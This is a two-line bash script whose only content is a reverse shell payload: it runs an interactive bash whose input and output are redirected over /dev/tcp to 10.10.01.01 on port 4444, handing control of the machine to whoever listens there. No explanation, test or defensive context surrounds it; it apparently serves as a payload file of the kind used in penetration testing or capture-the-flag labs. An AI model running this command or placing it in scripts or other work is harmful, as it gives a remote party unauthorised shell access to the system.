#!/bin/bash
bash -i >& /dev/tcp/10.10.01.01/4444 0>&1
